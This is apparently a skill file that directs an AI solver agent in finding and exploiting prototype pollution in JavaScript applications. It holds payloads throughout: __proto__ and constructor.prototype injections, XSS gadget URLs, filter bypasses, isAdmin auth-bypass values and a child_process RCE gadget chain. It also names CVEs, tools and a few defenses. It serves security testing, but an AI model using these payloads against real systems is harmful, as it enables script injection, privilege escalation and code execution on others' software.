---
name: prototype-pollution
description: "Prototype pollution detection and exploitation. Load when a solver encounters deep merge, Object.assign with user input, recursive property copy, or query string parsers creating nested objects."
---

# Prototype Pollution Exploitation Skill

## Source patterns

### URL query string
- `?__proto__[polluted]=value` via `qs` library, `jQuery.deparam`, custom parsers
- `?__proto__.polluted=value` via dot-notation parsers
- `?constructor[prototype][polluted]=value` — bypass for `__proto__` filters

### JSON input
- `{"__proto__": {"polluted": "value"}}` fed into merge/assign
- `{"constructor": {"prototype": {"polluted": "value"}}}`

### Deep merge / extend utilities
- `lodash.merge()`, `lodash.defaultsDeep()` — historically vulnerable, patched versions may still have gadgets
- `jQuery.extend(true, ...)` — deep extend with user input
- `hoek.merge()`, `deap.extend()`
- **CVE-2024-21529**: `dset` package — prototype pollution via path traversal
- **CVE-2024-21505**: `web3-utils` — prototype pollution
- **CVE-2024-21489**: `uplot` — prototype pollution

### Path-based assignment
- `lodash.set(obj, path, value)` where path is user-controlled
- Custom `setNestedProperty()` functions without `__proto__` checks

### Object.assign
- `Object.assign(target, userInput)` — only shallow, but if userInput has `__proto__` key

## Gadget hunting — the critical step

Finding a pollution source is only half the battle. You need a **gadget**: a property read from an object that was never explicitly set, used in a dangerous sink.

### Known client-side gadgets (ref: BlackFan/client-side-prototype-pollution)

**Google reCAPTCHA gadget**: Pollute `__proto__[srcdoc]` → injected into iframe srcdoc → XSS. Combined with jQuery.deparam source:
```
https://example.com/?__proto__[srcdoc]=<script>alert(document.domain)</script>
```

**Wistia embed gadget**: Reflected XSS on HackerOne via polluted properties (H1 report #986386).

**transport_url gadget** (PortSwigger reference): If code does `config.transport_url || '/default.js'` and transport_url is never set, pollute it:
```
?__proto__[transport_url]=data:,alert(1);//
```

**Script gadgets in libraries**: Many libraries check config objects on prototype chain:
- Handlebars: `__proto__.body` → template injection
- Lodash template: `__proto__.sourceURL` → code injection (gadget still unpatched in some versions)
- Nodemailer: `__proto__.sendmail` → command injection (server-side)

### Automated gadget finding
- **DOM Invader** (Burp Suite): Automatic client-side prototype pollution source + gadget detection. Enable PP detection in settings, browse the app, check results.
- **pp-finder** (YesWeHack): CLI tool for static analysis of JS files for potential gadgets
- **pollute.js** (Securitum): Dynamic gadget discovery script
- **Dasty** (Doyensec): Server-side prototype pollution gadget finder — identified 49 exploitable NPM packages including `ejs`, `nodemailer`, `workerpool`

### GHunter research (USENIX Security 2024)
Systematic study of universal gadgets in Node.js and Deno runtimes:
- 56 new gadgets in Node.js, 67 in Deno
- Vulnerabilities: arbitrary code execution (19), privilege escalation (31), path traversal (13)
- Key finding: **`child_process.spawn` gadget** — pollute `__proto__.shell` and `__proto__.env.NODE_OPTIONS` to achieve RCE. First discovered via CVE-2019-7609 (Kibana RCE by Michał Bentkowski).
- Key finding: fixing only the pollution source but leaving gadgets intact is dangerous — CVE-2023-31414 (Kibana) was due to incorrectly fixing a gadget.

## Filter bypasses

### `__proto__` keyword filtered
- Use `constructor.prototype` instead: `obj.constructor.prototype.polluted = true`
- Nested bypass: `__pro__proto__to__` (if filter is non-recursive single-pass)
- Unicode tricks if parser normalizes strings

### Recursive sanitization
- Try `constructor` path: `{"constructor": {"prototype": {"polluted": "value"}}}`
- Some sanitizers miss `Object.constructor.prototype`

### Effective defenses (recognize when you're blocked)
- `Object.freeze(Object.prototype)` — game over, no bypass possible
- `Object.create(null)` for config objects — no prototype chain
- `Map` instead of plain objects — immune to pollution
- Proper `hasOwnProperty()` checks before property access

## Exploitation chains

### Proto pollution → XSS
1. Find pollution source (URL param, JSON input)
2. Scan for gadgets in application code AND third-party libraries
3. Pollute a property that flows to innerHTML, script.src, eval, or similar XSS sink
4. Properties to try: `innerHTML`, `src`, `href`, `srcdoc`, `text`, `body`, `sourceURL`, `transport_url`

### Proto pollution → Sanitizer bypass
- Pollute DOMPurify config: `__proto__[ALLOWED_TAGS]` or `__proto__[ALLOW_UNKNOWN_PROTOCOLS]`
- DOMPurify 3.2.6 added proto pollution hardening for config — check if target uses older version

### Proto pollution → Auth bypass
- `__proto__[isAdmin] = true` — if code checks `user.isAdmin` without `hasOwnProperty`
- `__proto__[role] = "admin"`, `__proto__[verified] = true`

### Proto pollution → DoS
- `__proto__[length] = 0` — breaks array iteration
- `__proto__[toString]` override — breaks string coercion everywhere

## Testing approach
1. Find merge/assign/set call where user input flows in
2. Test: `{"__proto__": {"polluted": "yes"}}` → check if `({}).polluted === "yes"`
3. If `__proto__` filtered, try `constructor.prototype`
4. Once confirmed, scan for gadgets in ALL JS files (application + libraries)
5. Check PortSwigger's DOM Invader automated detection
6. Chain: source → polluted property → gadget → impact

## Key references
- PortSwigger prototype pollution: https://portswigger.net/web-security/prototype-pollution
- BlackFan client-side gadgets: https://github.com/BlackFan/client-side-prototype-pollution
- KTH server-side gadgets: https://github.com/KTH-LangSec/server-side-prototype-pollution
- Doyensec gadget finder: https://blog.doyensec.com/2024/02/17/server-side-prototype-pollution-Gadgets-scanner.html
- GHunter (USENIX 2024): https://arxiv.org/html/2407.10812v1
- Dasty (ACM Web 2024): Dynamic taint analysis for gadget detection — found CVE-2023-31415 in Kibana
- PayloadsAllTheThings: https://swisskyrepo.github.io/PayloadsAllTheThings/Prototype%20Pollution/
- NetSPI ultimate guide: https://www.netspi.com/blog/technical-blog/web-application-pentesting/ultimate-guide-to-prototype-pollution/
